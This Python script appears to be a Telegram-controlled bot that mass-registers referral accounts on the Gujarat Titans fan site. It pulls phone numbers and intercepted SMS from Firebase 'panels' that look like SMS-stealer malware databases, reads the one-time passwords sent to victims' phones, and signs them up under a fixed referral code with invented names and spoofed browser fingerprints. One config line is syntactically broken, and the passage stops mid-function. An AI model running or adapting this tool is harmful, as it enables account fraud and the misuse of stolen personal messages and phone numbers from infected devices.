import os
from flask import Flask
import threading
# ============================================================
# GT AUTO BOT — UNIVERSAL FIREBASE EDITION v2
# Gujarat Titans IPL Fan Registration + Referral
# ============================================================

import re, time, json, sys, os, subprocess, random, threading, gc, uuid
import requests as std_req
from datetime import datetime, timezone, timedelta
from collections import defaultdict

_IST = timezone(timedelta(hours=5, minutes=30))
def _now(): return datetime.now(_IST)

# ─────────────────────────────────────────────────────────────
# DEPENDENCY CHECK
# ─────────────────────────────────────────────────────────────
_REQUIRED = [
    ("curl_cffi", "curl_cffi", "Chrome TLS fingerprint"),
    ("requests",  "requests",  "HTTP client"),
    ("urllib3",   "urllib3",   "SSL warnings suppress"),
]

def _check_deps():
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace", line_buffering=True)
        sys.stderr.reconfigure(encoding="utf-8", errors="replace", line_buffering=True)
    except AttributeError: pass
    print("\033[96m\033[1m")
    print("  ┌─────────────────────────────────────────────────┐")
    print("  │      DEPENDENCY CHECK — GT Firebase Bot v2      │")
    print("  └─────────────────────────────────────────────────┘\033[0m")
    for pkg, imp, desc in _REQUIRED:
        try:
            __import__(imp)
            print(f"\033[92m  ✅  {pkg:<18} {desc:<28} [OK]\033[0m")
        except ImportError:
            print(f"\033[93m  ⚙  {pkg:<18} {desc:<28} [INSTALLING...]\033[0m", end="", flush=True)
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", pkg,
                     "--quiet", "--disable-pip-version-check", "--no-warn-script-location"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"\r\033[92m  ✅  {pkg:<18} {desc:<28} [INSTALLED]\033[0m")
            except Exception as e:
                print(f"\r\033[91m  ❌  {pkg:<18} {desc:<28} [FAILED: {e}]\033[0m")
    time.sleep(0.2)

_check_deps()

try:
    from curl_cffi import requests as cffi_req
    _CFFI = True
except ImportError:
    import requests as cffi_req
    _CFFI = False

import warnings
warnings.filterwarnings("ignore")

try:
    import urllib3
    urllib3.disable_warnings()
except: pass

# ─────────────────────────────────────────────────────────────
# CONFIG — EDIT HERE
# ─────────────────────────────────────────────────────────────
import os

BOT_TOKEN = os.environ.get("BOT_TOKEN")
TG_USER = int(os.environ.get("TG_USER")) REFERRAL_CODE = "GT-Z3K7EM"

# ── Proxy removed — direct connection ──
HARDCODED_PROXY = ""

# ── OTP timing ──
OTP_WAIT      = 10   # single wait — no retries, no polling
OTP_FRESH_WIN = 300  # message freshness window (5 min)

# ── Other config ──
ONLY_SIM1         = False
MAX_RETRIES       = 2
COOLDOWN_MIN      = 1.5
COOLDOWN_MAX      = 3.0
MAX_RESPONSE_BYTES = 2 * 1024 * 1024

# ─────────────────────────────────────────────────────────────
# FILE PATHS
# ─────────────────────────────────────────────────────────────
_DIR        = os.path.dirname(os.path.abspath(__file__))
USED_FILE   = os.path.join(_DIR, "used_gt.txt")
# PROXY_FILE removed
LOG_FILE    = os.path.join(_DIR, "gt_results.log")
STATE_FILE  = os.path.join(_DIR, "gt_bot_state.json")
PANELS_FILE = os.path.join(_DIR, "gt_panels.json")

# ─────────────────────────────────────────────────────────────
# GT API
# ─────────────────────────────────────────────────────────────
BASE      = "https://www.gujarattitansipl.com"
LOGIN_URL = f"{BASE}/login"

# GT OTP SMS pattern — matches "AD-AAVADE-S" sender format
GT_OTP_RE = re.compile(
    r'Use OTP\s+(\d{6})\s+to verify|'
    r'OTP\s+(\d{6})\s+to verify|'
    r'Dear Titans Fan[^\d]*(\d{6})|'
    r'OTP is[^\d]*(\d{6})|'
    r'\b(\d{6})\b.*(?:verify|Gujarat Titans|Titans)|'
    r'(?:Gujarat Titans|Titans Fan|AAVADE).*?\b(\d{6})\b',
    re.IGNORECASE | re.DOTALL
)

GT_SENDERS = ["ad-aavade", "aavade", "gujarat titan", "gt-", "titans", "torrent"]

# ─────────────────────────────────────────────────────────────
# COLORS
# ─────────────────────────────────────────────────────────────
ESC  = "\033["
R    = ESC+"91m"; G   = ESC+"92m"; Y   = ESC+"93m"; B   = ESC+"94m"
M    = ESC+"95m"; C   = ESC+"96m"; W   = ESC+"97m"; DIM = ESC+"2m"
BOLD = ESC+"1m";  RST = ESC+"0m";  BG_D = ESC+"40m"

def _ts(): return _now().strftime("%H:%M:%S")
def _log(sym, col, msg): print(f"{DIM}[{_ts()}]{RST} {col}{sym}{RST} {msg}", flush=True)
def ok(m):   _log("✅", G,      m)
def err(m):  _log("❌", R,      m)
def skip(m): _log("⏭️ ", Y,      m)
def info(m): _log("●",  C,      m)
def wait(m): _log("◌",  DIM,    m)
def warn(m): _log("⚠️ ", Y,      m)
def new(m):  _log("🎉", BOLD+G, m)

# ─────────────────────────────────────────────────────────────
# STATS
# ─────────────────────────────────────────────────────────────
_stats = {
    "done":0,"existing":0,"new_acct":0,"otp_fail":0,
    "skipped":0,"blocked":0,"start":time.time(),
    "current_panel":"-","current_phone":"-","loop":0
}
_stats_lock = threading.Lock()

def _stat(key, n=1):
    with _stats_lock:
        _stats[key] = _stats.get(key, 0) + n

_used = set()

def load_used():
    global _used
    if os.path.exists(USED_FILE):
        with open(USED_FILE, encoding="utf-8") as f:
            _used = {l.strip() for l in f if l.strip()}
    info(f"used_gt.txt: {len(_used)} already processed")

def mark_used(num):
    _used.add(num)
    with open(USED_FILE, "a", encoding="utf-8") as f:
        f.write(num + "\n")

def log_result(line):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{_now().strftime('%Y-%m-%d %H:%M:%S')}] {line}\n")

# ─────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────
def uptime_str():
    elapsed = int(time.time() - _stats["start"])
    h, rem  = divmod(elapsed, 3600)
    m, s    = divmod(rem, 60)
    return f"{h:02d}:{m:02d}:{s:02d}"

def clean_base_url(url):
    u = url.strip().rstrip("/")
    if u.endswith("/.json"): u = u[:-6]
    return u

def panel_label(url):
    m = re.search(r"https://([a-zA-Z0-9-]+)(?:-default-rtdb|\.firebaseio|\.asia)", str(url))
    return m.group(1) if m else str(url)[:30]

def clean_phone_number(raw_val):
    if not raw_val: return ""
    digits = re.sub(r"\D", "", str(raw_val))
    if len(digits) == 12 and digits.startswith("91"): digits = digits[2:]
    elif len(digits) == 11 and digits.startswith("0"):  digits = digits[1:]
    if len(digits) > 10: digits = digits[-10:]
    return digits if len(digits) == 10 and digits[0] in "6789" else ""

def load_bot_state():
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE) as f: return json.load(f)
        except: pass
    return {"running": True}

def save_bot_state(state):
    try:
        with open(STATE_FILE, "w") as f: json.dump(state, f)
    except: pass

def load_panels():
    if os.path.exists(PANELS_FILE):
        try:
            with open(PANELS_FILE) as f:
                d = json.load(f)
                return d if isinstance(d, list) else []
        except: pass
    return []

def save_panels(panels):
    with open(PANELS_FILE, "w") as f:
        json.dump(panels, f, indent=2)

# ─────────────────────────────────────────────────────────────
# NAMES POOL
# ─────────────────────────────────────────────────────────────
FIRST_NAMES = [
    "Aarav","Vivaan","Aditya","Vihaan","Arjun","Reyansh","Ayaan","Atharva",
    "Dhruv","Kabir","Rohan","Ishaan","Shivam","Kartik","Nikhil","Rahul",
    "Amit","Suresh","Rajan","Manish","Priya","Sneha","Pooja","Kavya",
    "Ananya","Nisha","Deepa","Rekha","Sunita","Meena","Kiran","Divya",
    "Anjali","Simran","Riya","Harsh","Yash","Dev","Raj","Siddharth",
]
LAST_NAMES = [
    "Sharma","Patel","Singh","Kumar","Gupta","Joshi","Verma","Yadav",
    "Mehta","Shah","Reddy","Nair","Iyer","Chaudhary","Tiwari","Pandey",
    "Mishra","Agarwal","Bansal","Kapoor","Malhotra","Chopra","Bhatia",
    "Anand","Saxena","Srivastava","Dubey","Dixit","Awasthi","Tripathi",
]

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
]
IMP_POOL = ["chrome120", "chrome110", "chrome107"]

# ─────────────────────────────────────────────────────────────
# PROXY — REMOVED (direct connection)
# ─────────────────────────────────────────────────────────────
GT_PROXY_LIST = []  # no proxy

def _build_proxy_dict(proxy_url=None):
    return None

def _load_extra_proxies():
    return []

def _get_proxy_url():
    return None

# ─────────────────────────────────────────────────────────────
# SESSION
# ─────────────────────────────────────────────────────────────
def new_session():
    ua  = random.choice(UA_POOL)
    imp = random.choice(IMP_POOL)
    info(f"🔌 Direct connection (no proxy)")
    try:
        if _CFFI:
            s = cffi_req.Session(impersonate=imp)
            return s, ua
    except: pass
    s = std_req.Session()
    # No proxy - direct
    s.trust_env = False
    return s, ua

def make_headers(ua):
    return {
        "accept"            : "application/json",
        "accept-language"   : "en-US,en;q=0.9",
        "content-type"      : "application/json",
        "origin"            : BASE,
        "referer"           : LOGIN_URL,
        "sec-ch-ua"         : '"Google Chrome";v="120","Chromium";v="120","Not(A:Brand";v="24"',
        "sec-ch-ua-mobile"  : "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest"    : "empty",
        "sec-fetch-mode"    : "cors",
        "sec-fetch-site"    : "same-origin",
        "user-agent"        : ua,
    }

# ─────────────────────────────────────────────────────────────
# GT API CALLS
# ─────────────────────────────────────────────────────────────
def _post(session, hdr, path, payload, extra=None):
    h = {**hdr, **(extra or {})}
    try:
        r = session.post(BASE + path, json=payload, headers=h, timeout=30)
        info(f"POST {path} → HTTP {r.status_code}")
        try:
            j = r.json()
            info(f"Resp: {str(j)[:300]}")
            return r.status_code, j
        except: return r.status_code, {}
    except Exception as e:
        err(f"POST {path} failed: {e}")
        return 0, {}

def _get(session, hdr, path, params=None, extra=None):
    h = {**hdr, **(extra or {})}
    try:
        r = session.get(BASE + path, params=params or {}, headers=h, timeout=30)
        try: return r.status_code, r.json()
        except: return r.status_code, {}
    except Exception as e:
        err(f"GET {path} failed: {e}")
        return 0, {}

def api_send_otp(session, hdr, mobile):
    return _post(session, hdr, "/apiv3/v2/messagepulse", {
        "data": {"mobile_no": mobile, "type": 1, "opt": 1,
                 "email_id": "", "Is_web": 1, "Is_app": 1,
                 "country_code": 91, "captcha": ""}
    })

def api_verify_otp(session, hdr, mobile, otp, req_id="SI"):
    return _post(session, hdr, "/apiv3/v2/checkpulse", {
        "data": {"mobile_no": mobile, "otp": otp, "captcha": "", "type": 1,
                 "country_code": "91", "accept_tnc": True, "accept_disclaimer": True,
                 "platform_type": 1, "platform_version": 1, "device_name": "web",
                 "requestId": req_id, "opt": 1, "Is_web": 1}
    })

def api_get_profile(session, hdr, token="", user_guid=""):
    p = {}
    if token:     p["token"]     = token
    if user_guid: p["user_guid"] = user_guid
    return _get(session, hdr, "/apiv4/auth/getProfile", params=p,
                extra={"referer": f"{BASE}/profile"})

def api_update_profile(session, hdr, token, user_guid, mobile, first, last, ref):
    return _post(session, hdr, "/apiv4/auth/updateProfile", {
        "data": {
            "user": {"first_name": first, "last_name": last, "gender": "", "dob": "",
                     "jersey_name": "", "subscribe_for_email": False,
                     "mobile_no": mobile, "internal_referral_code": ref,
                     "pincode": "", "city": "", "state_id": "",
                     "country_code": 91, "country_flag_id": 101, "country_id": 101},
            "email_id": "", "password": "", "confirm_password": "",
            "user_guid": user_guid, "captcha": "", "otp": ""
        }
    }, extra={"referer": f"{BASE}/profile", "authorization": f"Bearer {token}"})

# ─────────────────────────────────────────────────────────────
# FIREBASE — MEMORY-SAFE HTTP (no proxy needed for Firebase reads)
# ─────────────────────────────────────────────────────────────
def fb_get(url, timeout=10):
    try:
        with std_req.get(url, timeout=timeout, stream=True, verify=False) as r:
            if r.status_code != 200: return None
            buf = bytearray()
            for chunk in r.iter_content(chunk_size=16384):
                buf.extend(chunk)
                if len(buf) > MAX_RESPONSE_BYTES: return None
            if not buf or buf == b"null": return None
            return json.loads(buf.decode("utf-8", errors="ignore"))
    except: return None
    finally: gc.collect()

# ─────────────────────────────────────────────────────────────
# FIREBASE — DEVICE ONLINE CHECK (STRICT — fixes inflated count)
# ─────────────────────────────────────────────────────────────
def _is_online(info):
    """
    Strict online check — only trust explicit status field.
    No ping/lastSeen fallbacks (those caused 117 instead of 12-13).
    """
    if not isinstance(info, dict): return False
    st = info.get("status")
    # explicit boolean true
    if st is True: return True
    # string values
    if isinstance(st, str) and st.lower().strip() in ("true", "1", "online", "active", "on"):
        return True
    # integer 1
    if st == 1: return True
    return False

def _is_device_node(info):
    if not isinstance(info, dict): return False
    return bool({"status","battery","action","command","commands",
                 "ping","sendSms","send_sms","sms","smsCommand"} & set(info.keys()))

# ─────────────────────────────────────────────────────────────
# FIREBASE — PHONE EXTRACTION
# ─────────────────────────────────────────────────────────────
def extract_phone_from_device(info, base_url=None, dev_id=None):
    PHONE_FIELDS = ["mobNo","mob_no","mobile","phoneNumber","phone",
                    "number","rawNumber","cleanNumber","sim1Number","sim2Number"]
    for f in PHONE_FIELDS:
        p = clean_phone_number(info.get(f) or "")
        if p: return p

    for sub_key in ["action","command","commands","sendSms","send_sms","sms","smsCommand","webhookEvent"]:
        sub = info.get(sub_key)
        if not isinstance(sub, dict): continue
        for f in ["simNumber","sim1Number","sim2Number","ownNumber","deviceNumber",
                  "from","mobNo","mobile","phoneNumber","phone","number"]:
            v = sub.get(f)
            if v and str(v) not in ("0","1"):
                p = clean_phone_number(v)
                if p: return p
        nested = sub.get("sendSms")
        if isinstance(nested, dict):
            for f in ["from","mobNo","phoneNumber","phone","number","mobile"]:
                v = nested.get(f)
                if v and str(v) not in ("0","1"):
                    p = clean_phone_number(v)
                    if p: return p

    # carrier SMS fallback
    if base_url and dev_id:
        msgs = fb_get(f"{clean_base_url(base_url)}/messages/{dev_id}.json")
        if isinstance(msgs, dict):
            patterns = [
                r"Jio\s+Number\s+(\d{10})", r"Jio\s+number\s+(\d{10})",
                r"Airtel.*?(\d{10})", r"BSNL.*?(\d{10})", r"Vi.*?(\d{10})",
                r"your\s+(?:Jio\s+)?number.*?(\d{10})",
            ]
            for _, msg in list(msgs.items())[-20:]:
                if not isinstance(msg, dict): continue
                body = str(msg.get("message") or msg.get("body") or msg.get("text") or "")
                for pat in patterns:
                    m = re.search(pat, body, re.IGNORECASE)
                    if m:
                        p = clean_phone_number(m.group(1))
                        if p: return p
    return ""

# ─────────────────────────────────────────────────────────────
# FIREBASE — SMS RECENCY CHECK (last 1 hour filter)
# ─────────────────────────────────────────────────────────────
SMS_RECENCY_WINDOW = 3600  # 1 hour in seconds

def device_has_recent_sms(base_url, dev_id):
    """
    Returns True if device received any SMS in the last 1 hour.
    Checks all known SMS paths. If no messages found at all → skip.
    If messages found but all older than 1hr → skip.
    """
    clean_url = clean_base_url(base_url)
    msgs = None
    for path in [
        f"{clean_url}/messages/{dev_id}.json",
        f"{clean_url}/profex_incoming/{dev_id}.json",
        f"{clean_url}/{dev_id}/messages.json",
        f"{clean_url}/{dev_id}/sms.json",
        f"{clean_url}/sms/{dev_id}.json",
    ]:
        data = fb_get(path)
        if isinstance(data, dict) and data:
            msgs = data; break

    if not msgs:
        info(f"⏭ [{dev_id[:8]}] Koi SMS nahi — skip")
        return False

    now = time.time()
    latest_ts = None

    for key, msg_val in msgs.items():
        ts = get_msg_timestamp(key, msg_val)
        if ts is None:
            # try dateTime string parse (GT panel format)
            if isinstance(msg_val, dict):
                for tf in ["dateTime","date","created_at","received_at"]:
                    ts = parse_datetime_str(msg_val.get(tf))
                    if ts: break
        if ts:
            if ts > 1e12: ts /= 1000.0
            if latest_ts is None or ts > latest_ts:
                latest_ts = ts

    if latest_ts is None:
        # timestamps parse nahi hue — allow karo (safe fallback)
        info(f"⚠️ [{dev_id[:8]}] Timestamp parse nahi hua — allow")
        return True

    age = now - latest_ts
    if age <= SMS_RECENCY_WINDOW:
        ok(f"📨 [{dev_id[:8]}] Last SMS {int(age//60)}m {int(age%60)}s pehle — ✅ INCLUDE")
        return True
    else:
        info(f"⏭ [{dev_id[:8]}] Last SMS {int(age//3600)}h {int((age%3600)//60)}m pehle — SKIP (1hr se purana)")
        return False

# ─────────────────────────────────────────────────────────────
# FIREBASE — PANEL NUMBER DISCOVERY
# ─────────────────────────────────────────────────────────────
def get_panel_numbers(base_url):
    clean_url = clean_base_url(base_url)
    out, seen = [], set()

    for node in ["clients","devices","All_Users","users"]:
        data = fb_get(f"{clean_url}/{node}.json")
        if not isinstance(data, dict) or not data: continue

        sample = next(iter(data.values()))

        # shallow listing: {dev_id: true} — fetch individually
        if sample is True:
            info(f"📡 {node}: shallow listing ({len(data)}) — fetching individually")
            for dev_id in list(data.keys()):
                if not load_bot_state().get("running", True): break
                dinfo = fb_get(f"{clean_url}/{node}/{dev_id}.json")
                if not isinstance(dinfo, dict): continue
                if not _is_online(dinfo):
                    info(f"⏭ Offline [{dev_id[:8]}]"); continue
                info(f"✅ Online [{dev_id[:8]}] bat={dinfo.get('battery','?')}")
                if not device_has_recent_sms(base_url, dev_id): continue
                ph = extract_phone_from_device(dinfo, base_url, dev_id)
                if ph and ph not in seen:
                    out.append((ph, dev_id)); seen.add(ph)
                    ok(f"📱 {ph} [{dev_id[:8]}]")
                else:
                    warn(f"No phone [{dev_id[:8]}]")
            if out: return out
            continue

        # full objects — strict online check
        total_found  = len(data)
        online_count = 0
        info(f"📡 {node}: {total_found} devices total")
        for dev_id, dinfo in data.items():
            if not isinstance(dinfo, dict): continue
            if not _is_online(dinfo):
                continue
            online_count += 1
            info(f"✅ Online [{dev_id[:8]}] bat={dinfo.get('battery','?')} status={dinfo.get('status')}")
            if not device_has_recent_sms(base_url, dev_id): continue
            ph = extract_phone_from_device(dinfo, base_url, dev_id)
            if ph and ph not in seen:
                out.append((ph, dev_id)); seen.add(ph)
                ok(f"📱 {ph} [{dev_id[:8]}]")
            else:
                warn(f"No phone [{dev_id[:8]}]")
        info(f"📊 {node}: {online_count}/{total_found} online (recency filtered)")
        if out: return out

    # root-level fallback
    data = fb_get(f"{clean_url}/.json?shallow=true")
    if isinstance(data, dict):
        for dev_id, val in data.items():
            if val is not True: continue
            dinfo = fb_get(f"{clean_url}/{dev_id}.json")
            if not isinstance(dinfo, dict) or not _is_device_node(dinfo): continue
            if not _is_online(dinfo): continue
            ph = extract_phone_from_device(dinfo, base_url, dev_id)
            if ph and ph not in seen:
                out.append((ph, dev_id)); seen.add(ph)
    return out

def quick_panel_check(base_url):
    clean_url = clean_base_url(base_url)
    for node in ["clients","devices","All_Users","users"]:
        data = fb_get(f"{clean_url}/{node}.json")
        if not isinstance(data, dict) or not data: continue
        vals = list(data.values())
        if vals[0] is True:
            return len(data), len(data)
        total  = len(data)
        online = sum(1 for v in vals if isinstance(v, dict) and _is_online(v))
        return online, total
    return 0, 0

# ─────────────────────────────────────────────────────────────
# FIREBASE — SMS / OTP READING
# ─────────────────────────────────────────────────────────────
def fetch_messages(base_url, dev_id):
    clean_url = clean_base_url(base_url)
    for path in [
        f"{clean_url}/messages/{dev_id}.json",
        f"{clean_url}/profex_incoming/{dev_id}.json",
        f"{clean_url}/{dev_id}/messages.json",
        f"{clean_url}/{dev_id}/sms.json",
        f"{clean_url}/sms/{dev_id}.json",
        f"{clean_url}/All_Users/sms/{dev_id}.json",
    ]:
        data = fb_get(path)
        if isinstance(data, dict) and data:
            info(f"📨 SMS @ .../{dev_id[:8]} → {len(data)} msgs")
            return data
    return {}

def get_msg_body(msg_val):
    if isinstance(msg_val, str): return msg_val
    if isinstance(msg_val, dict):
        for f in ["message","body","text","msg","SMS","content","sms","Body","Message","messageText"]:
            v = msg_val.get(f)
            if v: return str(v)
    return str(msg_val)

def parse_datetime_str(dt_str):
    """Parse GT panel datetime format: '31-10-2026 | 10:57 pm'"""
    if not dt_str or not isinstance(dt_str, str): return None
    dt_str = dt_str.strip()
    if "T" in dt_str:
        try: return datetime.fromisoformat(dt_str.replace("Z", "+00:00")).timestamp()
        except: pass
    for fmt in [
        "%d-%m-%Y | %I:%M %p",
        "%d-%m-%Y | %I:%M%p",
        "%d-%m-%Y %I:%M %p",
        "%d/%m/%Y %I:%M %p",
        "%d/%m/%Y | %I:%M %p",
        "%Y-%m-%d %H:%M:%S",
        "%d-%m-%Y %H:%M:%S",
    ]:
        try: return datetime.strptime(dt_str, fmt).timestamp()
        except: pass
    return None

def get_msg_timestamp(key, msg_val):
    try:
        ts = float(key)
        if ts > 1_000_000_000:
            if ts > 1e12: ts /= 1000.0
            return ts
    except: pass
    if not isinstance(msg_val, dict): return None
    for tf in ["timestamp","time","ts","createdAt","receivedAt"]:
        v = msg_val.get(tf)
        if v:
            try:
                ts = float(v)
                if ts > 1_000_000_000:
                    if ts > 1e12: ts /= 1000.0
                    return ts
            except: pass
    for tf in ["dateTime","date","created_at","received_at"]:
        ts = parse_datetime_str(msg_val.get(tf))
        if ts: return ts
    return None

def extract_gt_otp(body):
    """
    Extract 6-digit OTP from GT SMS.
    Handles: 'Use OTP 488713 to verify your mobile number. Valid for 30 mins.'
    Sender: AD-AAVADE-S
    """
    if not body: return None
    text = str(body)
    for m in GT_OTP_RE.finditer(text):
        for g in m.groups():
            if g and len(g) == 6:
                return g
    # generic 6-digit fallback when GT-related content present
    if re.search(r'gujarat titan|titans fan|AAVADE|torrent gujarat', text, re.IGNORECASE):
        m = re.search(r'\b(\d{6})\b', text)
        if m: return m.group(1)
    return None

def sms_baseline(base_url, dev_id):
    msgs    = fetch_messages(base_url, dev_id)
    keys    = set(msgs.keys())
    max_id  = 0
    for k, v in msgs.items():
        try:
            mid = int(v.get("id", k) if isinstance(v, dict) else k)
            if mid > max_id: max_id = mid
        except: pass
    info(f"📱 SMS baseline: {len(keys)} msgs")
    return keys, max_id

def get_new_gt_otp(base_url, dev_id, baseline_keys, baseline_max_id, sent_time):
    msgs = fetch_messages(base_url, dev_id)
    if not isinstance(msgs, dict) or not msgs: return None

    now  = time.time()
    best = None

    for key, msg_val in msgs.items():
        body = get_msg_body(msg_val)
        otp  = extract_gt_otp(body)
        if not otp: continue

        is_new = key not in baseline_keys
        if not is_new:
            try:
                msg_id = int(msg_val.get("id", key) if isinstance(msg_val, dict) else key)
                if msg_id > baseline_max_id: is_new = True
            except: pass

        ts = get_msg_timestamp(key, msg_val)

        sender = ""
        if isinstance(msg_val, dict):
            sender = str(msg_val.get("sender") or msg_val.get("address") or "").lower()
        is_gt = any(s in sender for s in GT_SENDERS) or \
                re.search(r'gujarat titan|titans fan|torrent|AAVADE', body, re.IGNORECASE) is not None

        if ts is not None:
            age = now - ts
            if ts < sent_time - 120: continue
            if age > OTP_FRESH_WIN:  continue
        else:
            if not is_new and not is_gt: continue

        score = 0
        if is_gt:  score += 100
        if is_new: score += 50
        if ts:     score += min(ts / 1e10, 10)

        info(f"🔍 OTP candidate: {otp} | sender={sender[:25]} | new={is_new} | gt={is_gt}")

        if best is None or score > best[1]:
            best = (otp, score)

    if best:
        ok(f"✅ OTP = {best[0]}"); return best[0]
    return None

# ─────────────────────────────────────────────────────────────
# TELEGRAM
# ─────────────────────────────────────────────────────────────
_WAITING_STATE = {}
_bot_offset    = 0
TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}" if BOT_TOKEN else None

def tg_post(method, payload, timeout=12):
    if not TG_API: return None
    try:
        r = std_req.post(f"{TG_API}/{method}", json=payload, timeout=timeout)
        if r.status_code == 200: return r.json()
    except: pass
    return None

def tg_send(chat_id, text, keyboard=None):
    p = {"chat_id": chat_id, "text": text,
         "parse_mode": "HTML", "disable_web_page_preview": True}
    if keyboard: p["reply_markup"] = keyboard
    return tg_post("sendMessage", p)

def tg_edit(chat_id, mid, text, keyboard=None):
    p = {"chat_id": chat_id, "message_id": mid, "text": text,
         "parse_mode": "HTML", "disable_web_page_preview": True}
    if keyboard: p["reply_markup"] = keyboard
    tg_post("editMessageText", p)

def tg_answer(cb_id, text=""):
    tg_post("answerCallbackQuery", {"callback_query_id": cb_id, "text": text})

def tg_notify(text):
    if TG_USER: tg_send(TG_USER, text)

def _print_stats_text():
    with _stats_lock: d = _stats.copy()
    total = d["done"] + d["otp_fail"] + d["skipped"] + d["blocked"]
    return "\n".join([
        "🏏 <b>GT Bot — Live Stats</b>",
        "━━━━━━━━━━━━━━━━━━━━━",
        f"✅ Registered   : <b>{d['done']}</b>  (New: {d['new_acct']}  Exist: {d['existing']})",
        f"❌ OTP Failed   : <b>{d['otp_fail']}</b>",
        f"⏭ Skipped      : <b>{d['skipped']}</b>",
        f"🚫 Blocked      : <b>{d['blocked']}</b>",
        f"📱 Total Tried  : <b>{total}</b>",
        f"🔄 Loop         : <b>{d['loop']}</b>",
        f"📡 Panel        : <b>{d['current_panel']}</b>",
        f"📱 Current      : <b>{d['current_phone']}</b>",
        f"⏱ Uptime       : <b>{uptime_str()}</b>",
        f"🎯 Ref Code     : <b>{REFERRAL_CODE}</b>",
        f"🔄 Proxy        : <b>DataImpulse Rotational</b>",
    ])

def build_main_menu():
    panels = load_panels()
    state  = load_bot_state()
    status = "🟢 Running" if state.get("running", True) else "🔴 Stopped"
    with _stats_lock: d = _stats.copy()
    text = "\n".join([
        "🏏 <b>Gujarat Titans Auto Bot v2</b>",
        "━━━━━━━━━━━━━━━━━━━━━",
        f"⚡ Status     : <b>{status}</b>",
        f"📡 Panels     : <b>{len(panels)}</b>",
        f"✅ Registered : <b>{d['done']}</b>  (New: {d['new_acct']})",
        f"❌ OTP Fail   : <b>{d['otp_fail']}</b>",
        f"🔄 Loop       : <b>{d['loop']}</b>",
        f"⏱ Uptime     : <b>{uptime_str()}</b>",
        f"📱 Current    : <b>{d['current_phone']}</b>",
        f"🎯 Ref Code   : <b>{REFERRAL_CODE}</b>",
        "",
        "👇 <i>Select action:</i>",
    ])
    running = state.get("running", True)
    toggle  = {"text":"⏹ Stop","callback_data":"bot_stop"} if running \
              else {"text":"▶️ Start","callback_data":"bot_start"}
    kb = {"inline_keyboard": [
        [toggle, {"text":"🔄 Refresh","callback_data":"refresh_menu"}],
        [{"text":"📡 Panels","callback_data":"panels_menu"},
         {"text":"📊 Stats","callback_data":"live_stats"}],
        [{"text":"📜 Logs","callback_data":"recent_logs"},
         {"text":"🎯 Set Ref Code","callback_data":"set_ref"}],
    ]}
    return text, kb

def send_main_menu(chat_id):
    text, kb = build_main_menu()
    tg_send(chat_id, text, keyboard=kb)

def edit_main_menu(chat_id, mid):
    text, kb = build_main_menu()
    tg_edit(chat_id, mid, text, keyboard=kb)

# ─────────────────────────────────────────────────────────────
# MULTI-FIREBASE BULK ADD — parse newline-separated URLs
# ─────────────────────────────────────────────────────────────
def parse_firebase_urls_from_text(text):
    """
    Parse all Firebase URLs from a multi-line message.
    Supports newline-separated, space-separated, or comma-separated.
    """
    # Split on newlines, commas, spaces
    raw_parts = re.split(r'[\n,\s]+', text.strip())
    urls = []
    for part in raw_parts:
        part = part.strip()
        if not part: continue
        if part.startswith("http") and "firebase" in part.lower():
            clean = clean_base_url(part)
            urls.append(clean)
    return list(dict.fromkeys(urls))  # deduplicate, preserve order

def handle_callback(cb):
    global REFERRAL_CODE
    chat_id = cb["message"]["chat"]["id"]
    mid     = cb["message"]["message_id"]
    data    = cb.get("data","")
    cb_id   = cb["id"]
    if TG_USER and cb["from"]["id"] != TG_USER:
        tg_answer(cb_id, "❌ Access denied"); return
    tg_answer(cb_id)

    if data in ("main_menu","refresh_menu"):
        edit_main_menu(chat_id, mid)

    elif data == "bot_start":
        save_bot_state({"running": True})
        ok("Bot started via Telegram")
        edit_main_menu(chat_id, mid)

    elif data == "bot_stop":
        save_bot_state({"running": False})
        warn("Bot stopped via Telegram")
        edit_main_menu(chat_id, mid)

    elif data == "panels_menu":
        panels = load_panels()
        lines  = ["📡 <b>Firebase Panels</b>","━━━━━━━━━━━━━━━━━━━━━"]
        if not panels: lines.append("\n<i>Koi panel nahi. Add karo!</i>")
        else:
            for i,u in enumerate(panels,1): lines.append(f"{i}. <code>{panel_label(u)}</code>")
        kb = {"inline_keyboard":[
            [{"text":"➕ Add Panel","callback_data":"add_panel"},
             {"text":"➕➕ Bulk Add","callback_data":"bulk_add_panels"}],
            [{"text":"🗑 Remove One","callback_data":"remove_panel_list"},
             {"text":"🗑🗑 Delete All","callback_data":"delete_all_panels_confirm"}],
            [{"text":"📊 Check Status","callback_data":"panel_status"}],
            [{"text":"« Main Menu","callback_data":"main_menu"}],
        ]}
        tg_edit(chat_id, mid, "\n".join(lines), keyboard=kb)

    elif data == "add_panel":
        _WAITING_STATE[chat_id] = "awaiting_firebase"
        tg_edit(chat_id, mid,
                "➕ <b>Add Firebase Panel</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
                "Firebase URL bhejo:\n<code>https://xxx-default-rtdb.firebaseio.com</code>",
                keyboard={"inline_keyboard":[[{"text":"✖ Cancel","callback_data":"panels_menu"}]]})

    elif data == "bulk_add_panels":
        _WAITING_STATE[chat_id] = "awaiting_bulk_firebase"
        tg_edit(chat_id, mid,
                "➕➕ <b>Bulk Add Firebase Panels</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
                "Saari Firebase URLs ek saath bhejo\n"
                "(ek line mein ek URL):\n\n"
                "<code>https://panel1-default-rtdb.firebaseio.com\n"
                "https://panel2-default-rtdb.firebaseio.com\n"
                "https://panel3-default-rtdb.firebaseio.com</code>",
                keyboard={"inline_keyboard":[[{"text":"✖ Cancel","callback_data":"panels_menu"}]]})

    elif data == "delete_all_panels_confirm":
        panels = load_panels()
        if not panels:
